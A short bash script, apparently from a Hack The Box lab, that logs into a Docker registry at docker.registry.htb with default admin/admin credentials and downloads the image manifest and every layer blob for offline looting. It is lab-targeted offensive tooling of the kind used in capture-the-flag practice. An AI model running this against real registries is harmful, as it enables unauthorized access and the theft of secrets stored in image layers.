#!/bin/bash

REG="http://docker.registry.htb/v2"
IMAGE="bolt-image"
TAG="latest"
USER="admin"
PASS="admin"

echo "Downloading blob file..."
wget --user $USER --password $PASS $REG/$IMAGE/manifests/$TAG >/dev/null 2>&1

echo "Retrieving hash list..."
BLOBS=($(cat latest | grep blobSum | awk '{print $2}' | tr -d '"' | sed -r 's/:/%3A/g'))

for b in "${BLOBS[@]}"
do
  wget --user $USER --password $PASS $REG/$IMAGE/blobs/$b -O $b.tar.gz
done
